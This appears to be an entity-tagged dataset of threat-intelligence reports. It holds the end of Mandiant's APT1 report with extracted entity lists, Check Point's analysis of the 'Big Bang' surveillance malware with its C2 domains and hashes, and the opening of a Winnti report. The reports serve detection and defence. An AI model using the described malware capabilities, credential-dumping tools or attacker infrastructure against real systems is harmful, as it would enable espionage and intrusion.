<SOFTWARE>RedLine</SOFTWARE> analyzes each process and memory section using a variety of rules and techniques to calculate a “Malware 
Risk Index” for each process. This score is a helpful guide to identifying those processes that are more likely to be 
worth investigating. Processes at the highest risk of being compromised by malware are highlighted with a red badge. 
Those with some risk factors have a grey badge, and low-risk processes have no badge.

The MRI is not an absolute indication of malware. During an investigation you can refine the MRI scoring by adjusting 
specific hits (identifying false positives and false negatives) for each process, adding your own hits, and generally 
tuning the results.

IOCs

<SOFTWARE>RedLine</SOFTWARE> provides the option of performing IOC analysis in addition to MRI scoring. Supplied a set of IOCs, the <SOFTWARE>RedLine</SOFTWARE> 
Portable Agent will be automatically configured to gather the data required to perform a subsequent IOC analysis; after 
the analysis is run, IOC hit results are available for further investigation.

In addition, <SOFTWARE>RedLine</SOFTWARE> provides the ability to create an IOC Collector. This feature enables the collection of data types 
required for matching a set of IOCs. 

WORKS WITH <SOFTWARE>MIR</SOFTWARE>

Combined with <SOFTWARE>MIR</SOFTWARE>, <SOFTWARE>RedLine</SOFTWARE> is a powerful tool for accelerated live response. Here’s a typical case:

»» IDS or other system detects suspicious activity on a host

»» From <SOFTWARE>MIR</SOFTWARE>, an investigator launches a remote live response script

»» The <SOFTWARE>MIR</SOFTWARE> Agent running on the host captures and analyzes memory locally, streaming back a small XML audit that 
downloads in minutes rather than hours

»» From <SOFTWARE>MIR</SOFTWARE>, the user can open the audit directly in <SOFTWARE>RedLine</SOFTWARE>

»» Using <SOFTWARE>RedLine</SOFTWARE>, the investigator quickly identifies a malicious process, and writes an IOC describing the forensic 
attributes found in <SOFTWARE>RedLine</SOFTWARE>

»» Using <SOFTWARE>MIR</SOFTWARE> and MCIC, the investigator is quickly able to sweep for that IOC and discover all other systems on the 
network with the same (or similar) malware running



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 73 www.mandiant.com

Have <SOFTWARE>MIR</SOFTWARE> Customers had Access to these IOCs Before?

These IOCs are new! However, much of the detection capability in this set of indicators has already been available to 
our <SOFTWARE>MIR</SOFTWARE> customers. The IOCs may look different though as a result of improvements in creation and testing. <ORG>Mandiant</ORG> 
started <TIMESTAMP>2013</TIMESTAMP> with a focus on taking better advantage of our threat intelligence. We plan to continue to improve the 
synthesis of our threat intelligence and our IOCs by improving our breadth, IOC creation process, IOC management 
process, and IOC testing. The majority of these indicators, or modified versions of them, will be integrated into the next 
IOC release.

What Is the FAMILY Designator in This Set of IOCs?

We are using a new IOC designator in these IOCs called “(FAMILY).” <ORG>Mandiant</ORG>’s Threat Intelligence Unit tracks 
malware by common features seen in groups of binaries. We call those groupings of binaries “families.” The IOCs 
included in this appendix are representatives of families of malware used by <THREAT_ACTOR>APT1</THREAT_ACTOR>. The new designator follows the 
family name in the “Name” field of the IOC, and the presence of (FAMILY) implies that that IOC applies to the whole 
family, not just one sample.

Why Do These IOCs Look Somewhat Different Than Other IOCs I Have Seen From 
<ORG>Mandiant</ORG>?

In many cases we have combined information that previously would have been in several indicators into a single 
indicator. Additionally, we have removed certain types of intelligence, since they are being released in separate 
appendices (such as FQDNs and IPs).

Additionally, some IOCs in this set are using file permutation blocks to catch variants of malware that might not be 
detected otherwise.

What Is a File Permutation block? 

It is a different way to structure lists of File Item attributes to look for an entire family of malware versus only one or two 
pieces. For more information on this topic or most any other IOC questions go to https://forums.mandiant.com.

Will You Update These IOCs?

It is likely that we will make some changes to the IOCs in Appendix G as we get feedback. If updated, the updates will 
be available in the same location as the report http://www.mandiant.com/<THREAT_ACTOR>APT1</THREAT_ACTOR>.

Will You Be Releasing More IOCs Like This?

Currently, there are no plans for additional public releases of this magnitude. 



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 74 www.mandiant.com

aPPenDIx h (DIGItaL):  
vIDeo

This appendix is digital and can be found at http://www.mandiant.com/<THREAT_ACTOR>APT1</THREAT_ACTOR>. It includes a compilation of videos showing 
actual attacker sessions and their intrusion activities. 


	
	Executive Summary
	<COUNTRY>China</COUNTRY>’s Computer Network Operations Tasking to <THREAT_ACTOR>PLA Unit 61398</THREAT_ACTOR> (61398部队)
	<THREAT_ACTOR>APT1</THREAT_ACTOR>: Years of Espionage 
	<THREAT_ACTOR>APT1</THREAT_ACTOR>: Attack Lifecycle
	<THREAT_ACTOR>APT1</THREAT_ACTOR>: Infrastructure
	<THREAT_ACTOR>APT1</THREAT_ACTOR>: Identities
	Conclusion
	Appendix A: 
How Does <ORG>Mandiant</ORG> 
Distinguish Threat Groups?
	Appendix B: 
APT and the Attack Lifecycle
	Appendix C (Digital):
The Malware Arsenal
	Appendix D (Digital): 
FQDNs
	Appendix E (Digital): 
MD5 Hashes
	Appendix F (Digital): 
SSL Certificates
	Appendix G (Digital): 
IOCs
	Appendix H (Digital): 
Video",APT1;Unit 61398;APT;PLA Unit 61398;unit 61398;APT 1;Comment Crew;Comment Group;PLa unIt 61398;APT group;61398;Shady Rat;nitro;elderwood;sykipot;aurora;night Dragon,RedLine;MIR;Remote Desktop;REDLINE;Mandiant Intelligent Response;Microsoft’s Remote Desktop;Microsoft Outlook;Gmail;Windows;Mandiant Managed Defense;Microsoft® Word;Word 2007;Rocketmail;MSN Messenger;Jabber/XMPP;Gmail Calendar;Microsoft Exchange Server;Windows 2000;Google’s App Engine;TimeWrinkles;TimeCrunches,"Aerospace;Chemicals;Construction and Manufacturing;Education;Energy;Engineering Services;Financial Services;Food and Agriculture;Healthcare;Information Technology;Legal Services;Media, Advertising and Entertainment;Metals and Mining;Navigation;Public Administration;Satellites and Telecommunications;Scientific Research and Consulting;Transportation;finances;facility management;logistics;shipping;telecommunications;political;economic;Information and Communications Engineering;High-Tech Electronics;High-tech Electronics;International Organizations","Mandiant;PLA;GSD;China Telecom;China Unicom;CPC;People’s Liberation Army;General Staff Department;Google;MUCD;CNO;Microsoft;The Chinese People’s Liberation Army;Chinese government;Project 2049 Institute;Chinese academic journal;Symantec;Chinese Government;the Communist Party;RAND Corporation;Hebei Chamber of Commerce;China telecom;Nanhui Communication Park;Yahoo;Facebook;Chinese military;Central Military Commission;Northrop Grumman Corp;Department of Defense;Harbin Institute of Technology;Digital Bond;Bloomberg;Adobe;Apple;Chinese Defense Ministry;Washington Post;M-Trends;People’s Liberation army;Military unit Cover Designator;Chinese People’s Liberation Army;Joint Chiefs of Staff;The People’s Liberation Army;Communist Party;General Political Department;General Logistics Department;General Armaments Department;SIGINT;PLA Airforce;PLAA;PLA Navy;PLAN;PLa11;National Security Agency;the Defense Language Institute;the Defense Information Systems Agency;Military Unit Cover Designator;The Project 2049 Institute;CNA;CND;CNE;Skyhorse Publishing, Inc.;Military Unit Cover Designators;Chinese Army;Journal of Sichuan University;Journal of Information Engineering University;Journal of Military Communications Technology;Zhejiang University School of Computer Science and Technology;Jiangsu Longhai Construction Engineering Group;Zhejiang University;Jiangsu Langhai Construction Engineering Group;Shanghai Intercommunication Network Control Center;Shanghai Telecom;Telvent Canada Ltd;Schneider Electric;SCADA;Alien Vault;Samsung;Hong Kong University of Science and Technology;eNom, Inc.;Kai Optical Information Technology Co., Ltd.;CNN;Reuters;AOL;McAfee;Blackberry;Bluecoat;YAHOO!;Yahoo! Inc.;Twitter;Project 2049;Microsoft corp.","February 6, 2013;2012;2011;2006;2013;February 3, 2013;2010;2007;2008;2005;2002;2009;Feb. 1, 2013;since at least 2006;in early 2007;Since 2006;In the first month of 2011;Over a two-year period;January 2011 to January 2013;October 2004;January 2004;2012-02-23;2012-2-23;2005-08-18;2011-10-12;2004;16 Jan 2004;1982;October, 2011;January, 2013;October 4, 2011;Since 2004;January 2010;February 7, 2013;February 5, 2013;as early as 2006;4 Years, 10 Months;356 days;during this time period;Over the following 2.5 years;During this same time period;September 2012;IN June 2012;In November 2012;Wed, 18 Apr 2012 06:31:41;July 2006;2004-01-23;since early 2004;2009-08-07;2009-8-7;2008-7-8;July 2008;2006-08-03;2007-09-06;2008-06-16;2008-11-26;2009-06-02;2009-08-11;2009-08-18;2010-03-15;2010-11-04;2011-03-24;since 2004;25-Oct-2004 09:46:18 UTC;from 2004 until present;in September 2011;October 31, 2011;December 2012;back to 2004;October 25, 2004;September 10, 2012;06/29/2007;in February of 2011;February 2, 2006",WEBC2;GETMAIL;MAPIGET;BISCUIT;WEBC2-TABLE;Beachhead Backdoors;MANITSME;AURIGA;BANGAT;Gh0st RAT;Standard Backdoors;COOKIEBAG;WEBC2-QBP;Poison Ivy;WEBC2-KT3;WEBC2-UGX;LIGHTDART;HELAUTO;weBC2;WEBC2-AUSOV;WEBC2-ADSPACE;WEBC2-BOLID;WEBC2-CLOVER;WEBC2-CSON;WEBC2-DIV;WEBC2-GREENCAT;WEBC2-HEAD;WEBC2-RAVE;WEBC2-TOCK;WEBC2-YAHOO;WEBC2-Y21K;SEASALT;LONGRUN;WEBC2.TOCK;WEBC2.YAHOO;WARP TABMSGSQL;WEBC2.CSONWEBC2.QBP;COMBOSWEBC2.DIV;GLOOXMAIL;MINIASP;BOUNCER;WEBC2.TABLE;WEBC2.BOLIDKURTON;CALENDAR;GDOCUPLOAD;LIGHTBOLT;WEBC2.Y21K;WEBC2.KT32004;MANITSMEWEBC2.UGX;STARSYPOUNDTARSIP;DAIRY;SWORD;WEBC2.AUSOVHACKSFASE;WEBC2.CLOVERGREENCAT;MACROMAILGOGGLES;NEWSREELSWEBC2.RAVE;WEBC2.ADSPACE;WEBC2.HEAD;MaCroMaIL;GLooxMaIL;CaLenDar;GREENCAT;MACROMAIL;TABMSGSQL;TARSIP,China;U.S.;US;United States;Canada;Taiwan;United Kingdom;Australia;Europe;Asia;Norway;Japan;Singapore;India;Belgium;Korea;Hong Kong;France;South Africa;UAE;Israel;Switzerland;Luxemborg;cn;South Korea;Mexico;Denmark;Indonesia;CN;Guatemala;USA;Malaysia;Philippines,hugesoft.org;myyahoonews.com;223.166.0.0 - 223.167.255.255;58.246.0.0 - 58.247.255.255;112.64.0.0 - 112.65.255.255;139.226.0.0 - 139.227.255.255;kevin.mandia@rocketmail.com;uszzcs.com;todayusa.org;msnhome.org;114.80.0.0 - 114.95.255.255;58.247.242.254;ug-co.hugesoft.org;attnpower.com;ifexcel.com;issnbgkit.net;progammerli.com;idirectech.com;livemymsn.com;webservicesupdate.com;giftnews.org;conferencesinfo.com;phoenixtvus.com;newsesport.com;bluecoate.com;arrowservice.net;businessconsults.net;infosupports.com;newsonet.net;purpledaily.com;microsoft-update-info.com;comrepair.net;gmailboxes.com;oplaymagzine.com;cnndaily.com;copporationnews.com;nytimesnews.net;cnnnewsdaily.com;applesoftupdate.com;micyuisyahooapis.com;infobusinessus.org;lfengg@163.com;aunewsonline.com;Canadatvsite.com;sb.hugesoft.org;Internal_Discussion_Press_Release_In_Next_Week8.zip;2012ChinaUSAviationSymposium.zip;Employee-Benefit-and-Overhead-Adjustment-Keys.zip;MARKET-COMMENT-Europe-Ends-Sharply-Lower-On-Data-Yields-Jump.zip;Negative_Reports_Of_Turkey.zip;New_Technology_For_FPGA_And_Its_Developing_Trend.zip;North_Korean_launch.zip;Oil-Field-Services-Analysis-And-Outlook.zip;POWER_GEN_2012.zip;Proactive_Investors_One2One_Energy_Investor_Forum.zip;Social-Security-Reform.zip;South_China_Sea_Security_Assessment_Report.zip;Telephonics_Supplier_Manual_v3.zip;The_Latest_Syria_Security_Assessment_Report.zip;Updated_Office_Contact_v1.zip;Updated_Office_Contact_v2.zip;Welfare_Reform_and_Benefits_Development_Plan.zip;updated_office_contact_v1.zip;d7aa32b7465f55c368230bb52d52d885;\work\code\2008-7-8muma\mywork\winInet_winApplication2009-8-7\mywork\aaaaaaa2012-2-23\Release\aaaaaaa.pdb;c1393e77773a48b1eea117a302138554;D:\work\code\2008-7-8muma\mywork\winInet_winApplication2009-8-7\mywork\aaaaaaa\Release\aaaaaaa.pdb;101.80.0.0 - 101.95.255.255;sh-ipmaster@Chinaunicom.cn;143.89.0.0 - 143.89.255.255;7cback.hugesoft.org;ustvb.com;hvmetal.com;hkcastte.com;bpyoyo.com;skyswim.net;cslisten.com;bigish.net;chileexe77.com;onefastgame.net;cometoway.org;usnftc.org;ushongkong.org;youipcam.com;olmusic100.com;bigdepression.net;blackcake.net;avvmail.com;shepmas.com;syscation.com;tibethome.org;busketball.com;maltempata.com;nirvanaol.com;satellitebbs.com;usabbs.org;ns06.net;HUGESOFT.ORG;etejedaa@yahoo.com;aoldaily.com,"DOTA;UG;SH;UglyGorilla;SUPERHARD;Mark A. Stokes;Ugly Gorilla;Zhang;Mei Qiang;Jenny Lin;L.C. Russell Hsiao;Wang Weizhong;Kevin Mandia;uglygorilla@163.com;zheng youjun;Wang Dong;JackWang;Mike Rogers;James C. Mulvenon;Andrew N. D. Yang;Bryan Krekel;Patton Adams;George Bakos;Li Bingbing;Peng Fei;Chen Yiqun;Brian Krebs;Chloe Whiteaker;Greenfield;159-2193-7229;mei_qiang_82@sohu.com;Ian Easton;Dennis J. Blasko;Yu Yunxiang;Li Bing-bing;Wang Yan-Bo;Xu Ming;Zeng Fan-jing;Yu Yun-xiang;Chang Li;Zhao Ji-yong;Geng Chang-suo;Chen Qiyun;Chen Xiuzhen;Fan Lei;Joseph Casey;Katherine Koleski;Reid Wightman;Jaime Blasco;Mr. Mandia;yanling ruan;huge soft;hugesoft;Victor;Michael Murphy;yrus R. Atkinson, Jr.;Zhang Zhaozhong;uglyGorilla;ug;Wang;d0ta010@hotmail.com;dota.d013@gmail.com;dota.d001;dota.d015;d0ta001@hotmail.com;do.ta.5011;Rodney;Raith;poter.spo1@gmail.com;dota.sb005@gmail.com;dota.d001@gmail.com;superhard corp.;SuperHard_M;mei_qiang_82;greenfield",,HTRAN;HUC Packet Transmit Tool;cachedump;fgdump;gsecdump;lslsass;mimikatz;pwdump7;pwdumpx;psexec;FTP;web;RDP;pwdump,,,,social engineering;spear phishing;pass-the-hash;rootkits,Shanghai;Beijing;Gaoqiaozhen;Santa Monica;New York;Gaoqiao Town;Gaoqiao;Yellow Springs;Calgary;Guizhou;Pasadena;Houston;Sydney;Salt Lake;Washington;Homewood;Kalkaska;Shallotte;Yellow Spring;Provo;Shenzhen;Birmingham;Scottsdale;Sunnyvale;Albany;Pearl River;Chicago;Moscow;Nanning;Wuhua,,605,70,47,352,165,125,177,209,182,0,27,0,0,0,4,127,0
apt-attack-middle-east-big-bang,"CHECKPOINT.COM

PUBLICATIONS TOOLS ABOUT US CONTACT US

SUBSCRIBE

<THREAT_ACTOR>APT</THREAT_ACTOR> Attack In the <COUNTRY>Middle East</COUNTRY>: <CAMPAIGN>The Big Bang</CAMPAIGN>
<TIMESTAMP>July 8, 2018</TIMESTAMP>

<TIMESTAMP>Over the last few weeks</TIMESTAMP>, the <ORG>Check Point Threat Intelligence Team</ORG> discovered the comeback of an <THREAT_ACTOR>APT</THREAT_ACTOR>

surveillance attack against institutions across the <COUNTRY>Middle East</COUNTRY>, specifically the <ORG>Palestinian Authority</ORG>.

The attack begins with a phishing email sent to targets that includes an attachment of a self-extracting

archive containing two files: a <SOFTWARE>Word</SOFTWARE> document and a malicious executable. Posing to be from the

<ORG>Palestinian Political and National Guidance Commission</ORG>, the <SOFTWARE>Word</SOFTWARE> document serves as a decoy,

distracting victims while the malware is installed in the background.

Search IPS Protections, Malware Families, Applications and more...

https://www.checkpoint.com/
https://www.facebook.com/checkpointsoftware
https://plus.google.com/+checkpoint/posts
https://www.linkedin.com/company/check-point-software-technologies
mailto:?to=&subject=Research.CheckPoint.com&body=Checkout%20the%20latest%20research%20on%20Research.CheckPoint.com!
https://research.checkpoint.com/feed
https://twitter.com/checkpointsw
https://research.checkpoint.com/
https://research.checkpoint.com/category/threat-research/
https://research.checkpoint.com/about-us/
https://research.checkpoint.com/contact/
https://research.checkpoint.com/subscription/
https://www.checkpoint.com/support-services/threatcloud-incident-response/


The malware has several modules, some of which are:

Taking a screenshot of the infected machine and sending it to the C&C server.

Sending a list of documents with file extensions including .doc, .odt, .xls, .ppt, .pdf and more.

Logging details about the system.

Rebooting the system.

Self-destructing the executable.

While it is not clear exactly what the attacker is looking for, what is clear is that once he finds it, a second

stage of the attack awaits, fetching additional modules and/or malware from the Command and Control

server. This then is a surveillance attack in progress and has been dubbed ‘<CAMPAIGN>Big Bang</CAMPAIGN>’ due to the

attacker’s fondness for the ‘Big Bang Theory’ TV show, after which some of the malware’s modules are

named.

A previous campaign of this <THREAT_ACTOR>APT group</THREAT_ACTOR> was uncovered by <ORG>Talos</ORG> in <TIMESTAMP>June 2017</TIMESTAMP>, and since then very little of

this operation was seen in the wild. The <CAMPAIGN>Big Bang</CAMPAIGN> campaign described below incorporates improved

capabilities and offensive infrastructure, and seems to be even more targeted.

 

What’s New in <COUNTRY>Ramallah</COUNTRY>?

The first instances of the current campaign began to appear <TIMESTAMP>in the middle of April this year</TIMESTAMP>. But, thanks to

the attackers known affection for decoy documents that pose as news summaries, we were able to date

the campaign back to <TIMESTAMP>March 2018</TIMESTAMP>.

This campaign, as well as those in its previous form, uses phishing methods to deliver its reconnaissance

stage malware. But unlike in <TIMESTAMP>2017</TIMESTAMP>, this time the malicious attachment is an executable which is actually a

self-extracting archive, containing a decoy document and the malware itself. It is almost superfluous to

mention that in order to give the file a legitimate look, the developers pinned it to a <SOFTWARE>Word</SOFTWARE> icon and called

it “ا������ ا����� ا����ي” (Monthly Press Report).

When this file is double clicked, it opens a <SOFTWARE>Word</SOFTWARE> document with the logo of the <ORG>Palestinian Political and National Guidance Commission</ORG>. This document pretends to be a press report and contains news

headlines that were actually copied from various Palestinian news websites.

While the victim is distracted with the legitimate looking <SOFTWARE>Word</SOFTWARE> document, an additional executable which

is archived alongside the decoy document is installed in the background.

https://blog.talosintelligence.com/2017/06/palestine-delphi.html


Figure 1: Screenshot of <SOFTWARE>Word</SOFTWARE> Document.

Although the archive was found on <TIMESTAMP>mid-April</TIMESTAMP>, the <SOFTWARE>Word</SOFTWARE> document shows that it was last edited on <TIMESTAMP>March 29 , 2018</TIMESTAMP>. This date is also mentioned in the document’s body and used as its title, “<IOC>29-3.doc</IOC>”. The

metadata in the document shows that it was also titled “���� دة ا����� /���م أ�����”, which happens to be the
name of the <ORG>Guidance Commission Office</ORG>’s Chief Executive:

th

https://research.checkpoint.com/wp-content/uploads/2018/07/Fig-1.png
https://research.checkpoint.com/wp-content/uploads/2018/07/Fig-2.png


The naming convention and content of the file may indicate an attacker’s familiarity with the nature of the

victim.

 

Analysis

While the analysis below discloses the capabilities of the spotted malware, we are pretty sure it is part of

a multi-staged attack that targets very specific victims. The malware below is part of the reconnaissance

stage and should lead to the main course, whose nature is still unknown.

As for the malware’s language, <TIMESTAMP>during the 2017</TIMESTAMP> campaign the group used a fairly unsophisticated

malware, dubbed “<MALWARE>Micropsia</MALWARE>”, written in <SOFTWARE>C++</SOFTWARE> and wrapped in <SOFTWARE>Delphi</SOFTWARE>. In this year’s campaign, the

attackers use an upgraded variant of this malware, still written in <SOFTWARE>C++</SOFTWARE> but wrapped as a self-extracting

executable.

 

The Executable

The executable contained in the archive is called “<IOC>DriverInstallerU.exe</IOC>” but its metadata shows that its

original name is “<IOC>Interenet Assistant.exe</IOC>”.

Once it is executed, the malware ensures its persistence by setting a mutex (“InterenetAssistantN”),

copying itself to the “ProgramData” directory, and adding itself to the scheduled tasks.

Once secured, the malware communicates, by default, with a primary hardcoded command and control

website that varies in different samples (<IOC>spgbotup[.]club</IOC>). The <THREAT_ACTOR>APT</THREAT_ACTOR> actors, hardcoded additional backup

C&C website (<IOC>lindamullins[.]info</IOC>) that is contacted in case the malware does not get a response from the

first website. This is likely to be a mechanism that the threat actors implemented in order to handle

cases in which they would have to go through infrastructure changes.

Figure 3: Hardcoded 2 command and Control Websites.

https://research.checkpoint.com/wp-content/uploads/2018/07/Fig-3.png


Once the sample is able to reach the main C&C, the first thing it does is fingerprint the system (user and

PC names, OS version and AntiVirus engines), and exfiltrate the gathered information.

Figure 4: Initial Beacon.

Following this, a POST request is sent to the C&C every once in a while

(/api/serv/requests/[base64_fingerprint]), and in turn, the C&C sends back a configuration file that turns

on specific functionalities of the malware.

 

 

 

Figure 5: C&C Commands

What is interesting is that each key in this configuration file represents a different module in the

executable, and when the key is marked as true the executable will run the relevant module’s content. In

addition, the names of those modules are taken from the popular sitcom, ‘The Big Bang Theory’, in

addition to actors’ names from the popular Turkish TV series ‘Resurrection: Ertugrul’ (<IDENTITY>Celal Al</IDENTITY>, <IDENTITY>Sonmez</IDENTITY>
and <IDENTITY>Gokhan</IDENTITY>).

In the configuration file we found thirteen keys for thirteen different modules. However, in our samples

we could find only five corresponding modules. This could mean that this campaign is evolving and that

there will likely be more samples in the future that will implement the missing parts.

The following table describes the role of each module:

Module Name Purpose

<MALWARE>Penny</MALWARE> Takes a screenshot of the infected machine and sends it to the server

<MALWARE>Wolowitz_Helberg</MALWARE>
Enumerates running processes, saves their names and their IDs in

“<IOC>sat.txt</IOC>” and sends the file to the server

https://research.checkpoint.com/wp-content/uploads/2018/07/Fig-4.png


<MALWARE>Celal_Al</MALWARE> Sends a list of documents with certain extensions. The extensions are:

doc, docx, odt, xls, xlsx, ppt, pptx, accdb, accde, mdb, pdf, csv

<MALWARE>Runfile</MALWARE> Runs a file, receives a process name and a file type from the server

<MALWARE>Nayyar_Sonmez</MALWARE>
Downloads a file with a ‘.txt’ extension from a given URL, changes the

extension to ‘.exe’ and runs it

<MALWARE>Koothrappali</MALWARE> Logs details about the system and sends them to the server

<MALWARE>Bialik_Gokhan</MALWARE> Reboots the system

<MALWARE>Hofstadter</MALWARE> Terminates a process by name

<MALWARE>Parsons_Sheldon</MALWARE> Deletes the payload from the startup folder and deletes the actual file

<MALWARE>Reshad_Strik</MALWARE> Sends a list of the partitions found on the infected machine

<MALWARE>Pinar8</MALWARE> No such module in our sample

<MALWARE>Mehmet7</MALWARE> No such module in our sample

<MALWARE>Bahar6</MALWARE> No such module in our sample

It is important to note that unlike <MALWARE>RATs</MALWARE> that try to keylog the infected system and harvest credentials, this

sample shows the irregular behavior of looking for <SOFTWARE>Microsoft Office</SOFTWARE> documents on the victim’s machine,

or enumerating partitions. In addition, the file has the capability of downloading and running another

executable

After reviewing all the malware functionalities, we are confident in saying that the attackers look for

victims who answer well-defined characteristics and believe that further stages of the attack are

delivered only to those who fit the specific victim profile.

 

The Attacker’s English Level

The typo in the file’s name (<IOC>Interenet Assistant</IOC>) helped us find another executable with the same name

that is almost identical to the original one. In addition, using the communication pattern we were able to

find another sample called “<IOC>DriverInstallerU</IOC>”. In this sample, however, the module names were changed

from actors and characters’ names to car models, namely “<MALWARE>BMW_x1</MALWARE>”, “<MALWARE>BMW_x2</MALWARE>” and up to “<MALWARE>BMW_x8</MALWARE>”.

But typos are not the only English mistakes of this <THREAT_ACTOR>APT group</THREAT_ACTOR>. Incorrect grammar phrases in the C2

websites also assisted in uncovering the operation infrastructure.



Unlike what is generally expected from a C&C, browsing the websites actually returns the following

response:

Websites related to this campaign use readymade bootstrap templates, but include unique and

grammatically incorrect strings such as “Probably the most Music Site in the world!”, and

“<IOC>contact@namylufy[.]com</IOC>” in some of the websites.

Those strings helped us find other websites that use the same template, and while they could not be

linked to specific malware samples, it is possible that they will be used in the future.

 

Looking Back

https://research.checkpoint.com/wp-content/uploads/2018/07/Fig-6.png
mailto:contact@namylufy[.]com
https://research.checkpoint.com/wp-content/uploads/2018/07/Fig-7.png


While the <THREAT_ACTOR>APT</THREAT_ACTOR> has gone through significant upgrades <TIMESTAMP>over the past year</TIMESTAMP>, the conductors of these

campaigns maintained evident fingerprints, both in the delivery methods and malware development

conventions. These unique traces assisted us in correlating the current wave to past attacks, and may

also have some resemblance to attacks related to the <THREAT_ACTOR>Gaza Cybergang</THREAT_ACTOR> <THREAT_ACTOR>APT group</THREAT_ACTOR>.

During our investigation we spotted three instances of the renewed operation, but unique artifacts in the

command and control website revealed a wider infrastructure that may well manage more unknown

samples.

In addition, the concept of using self-extracting archives and decoy documents is not groundbreaking or

new, as we have seen similar attacks being carried in the past by the <THREAT_ACTOR>Gaza Cybergang</THREAT_ACTOR> <THREAT_ACTOR>APT group</THREAT_ACTOR>.

There were, however, many similarities between the samples we found and the ones which were found

<TIMESTAMP>during the 2017</TIMESTAMP> campaign, such as the usage of actor and character names from renowned TV series, as

well as fingerprinting the system and sending the information to the C&C. According to <ORG>Talos</ORG>, those files

were distributed to victims in the Palestinian law enforcement agencies <TIMESTAMP>during 2017</TIMESTAMP>.

However, in <TIMESTAMP>2017</TIMESTAMP> the group used an executable wrapped in Delphi, whereas the sample we found uses a

self-extracting archive. Both of the above open a document as well as another executable (written in <SOFTWARE>C++</SOFTWARE>)

when they are double clicked.

Finally, the C&C communication has also been improved in the recent campaign, as backup domains did

not appear in the old ones. In addition, the newer malware strain has stronger capabilities and a wider

functionality than the older one, which would only send information about the system version.

 

Conclusion

With the experience gained from the <THREAT_ACTOR>APT</THREAT_ACTOR> attack that began in <TIMESTAMP>March 2017</TIMESTAMP>, it seems this campaign has

evolved into an attack with new capabilities, and an even more specific target, <TIMESTAMP>over a year later</TIMESTAMP>.

Although the group behind it seems to be focused on carefully selecting their victims, using a custom-

made info-stealer for intelligence gathering operations, due to its very nature it is difficult to assert what

the ultimate goal of this campaign is. Indeed, the next stages of the attack may even still be in the works,

not yet deployed or only deployed to selected few victims.

In addition, although the clear fingerprints of the perpetrators leave no doubt we are witnessing the

comeback of the same <THREAT_ACTOR>APT</THREAT_ACTOR>, it is still not yet confirmed exactly who the threat group behind this campaign

actually is. As no concrete attribution has yet been made, due to the shared interests and malware

features of both <TIMESTAMP>2017</TIMESTAMP> and <TIMESTAMP>2018</TIMESTAMP> campaigns, the <THREAT_ACTOR>Gaza Cybergang</THREAT_ACTOR> may be a good starting point for further

research.



PUBLICATIONS

G O C C O S

TOOLS
SANDBLAST FILE ANALYSIS

URL CATEGORIZATION

INSTANT SECURITY ASSESSMENT

LIVE THREAT MAP

 

Indicators of Compromise

<IOC>a210ac6ea0406d81fa5682e86997be25c73e9d1b</IOC>

<IOC>994ebbe444183e0d67b13f91d75b0f9bcfb011db</IOC>

<IOC>74ea60b4e269817168e107bdccc42b3a1193c1e6</IOC>

<IOC>511bec782be41e85a013cbea95725d5807e3c2f2</IOC>

<IOC>9e093a5b34c4e5dea59e374b409173565dc3b05b</IOC>

 

<IOC>lindamullins[.]info</IOC>

<IOC>spgbotup[.]club</IOC>

<IOC>namyyeatop[.]club</IOC>

<IOC>namybotter[.]info</IOC>

<IOC>sanjynono[.]website</IOC>

<IOC>exvsnomy[.]club</IOC>

<IOC>ezofiezo[.]website</IOC>

<IOC>hitmesanjjoy[.]pro</IOC>

 

 

https://research.checkpoint.com/category/threat-intelligence-reports/
https://threatemulation.checkpoint.com/
https://www.checkpoint.com/urlcat/
https://www.cpcheckme.com/checkme/
https://threatmap.checkpoint.com/ThreatPortal/livemap.html


×

Subscribe to Cyber Intelligence Reports for the most current news and insights.

GLOBAL CYBER ATTACK REPORTS

RESEARCH PUBLICATIONS

INCIDENT RESPONSE

IPS ADVISORIES

<ORG>CHECK POINT</ORG> BLOG

DEMOS

ABOUT US CONTACT US

SUBSCRIBE

© <TIMESTAMP>1994-2018</TIMESTAMP> <ORG>Check Point Software Technologies</ORG> LTD. All rights reserved.  

Propery of checkpoint.com | Privacy Policy

https://research.checkpoint.com/category/threat-intelligence-reports/
https://research.checkpoint.com/category/threat-research/
https://research.checkpoint.com/category/incident-response/
https://www.checkpoint.com/advisories/
https://blog.checkpoint.com/
https://research.checkpoint.com/category/demos/
https://research.checkpoint.com/about-us/
https://research.checkpoint.com/contact/
https://research.checkpoint.com/subscription/
https://www.checkpoint.com/
https://research.checkpoint.com/privacy-policy/",APT;APT group;Gaza Cybergang,Word;C++;Delphi;Microsoft Office,,Palestinian Political and National Guidance Commission;Talos;Check Point Threat Intelligence Team;Palestinian Authority;Guidance Commission Office;CHECK POINT;Check Point Software Technologies,"2017;during the 2017;July 8, 2018;Over the last few weeks;June 2017;in the middle of April this year;March 2018;mid-April;March 29 , 2018;over the past year;during 2017;March 2017;over a year later;2018;1994-2018",Micropsia;Penny;Wolowitz_Helberg;Celal_Al;Runfile;Nayyar_Sonmez;Koothrappali;Bialik_Gokhan;Hofstadter;Parsons_Sheldon;Reshad_Strik;Pinar8;Mehmet7;Bahar6;RATs;BMW_x1;BMW_x2;BMW_x8,Middle East;Ramallah,spgbotup[.]club;lindamullins[.]info;29-3.doc;DriverInstallerU.exe;Interenet Assistant.exe;sat.txt;Interenet Assistant;DriverInstallerU;contact@namylufy[.]com;a210ac6ea0406d81fa5682e86997be25c73e9d1b;994ebbe444183e0d67b13f91d75b0f9bcfb011db;74ea60b4e269817168e107bdccc42b3a1193c1e6;511bec782be41e85a013cbea95725d5807e3c2f2;9e093a5b34c4e5dea59e374b409173565dc3b05b;namyyeatop[.]club;namybotter[.]info;sanjynono[.]website;exvsnomy[.]club;ezofiezo[.]website;hitmesanjjoy[.]pro,Celal Al;Sonmez;Gokhan,Big Bang;The Big Bang,,,,,,,,13,12,0,9,18,18,3,22,3,3,0,0,0,0,0,0,0
WINNTI GROUP_ Insights From the Past,"4/21/2020 <THREAT_ACTOR>WINNTI</THREAT_ACTOR> GROUP: Insights From the Past — <ORG>QuoIntelligence</ORG> - Our Finished Intelligence, Tailor-made for Your Organization

https://iuointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 1/13

April 20, 2020

<THREAT_ACTOR>WINNTI</THREAT_ACTOR> GROUP: Insights From the Past
quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past

Newly uncovered DNS tunnelling technique, and new
campaign against South Korean gaming company

Executive Summary
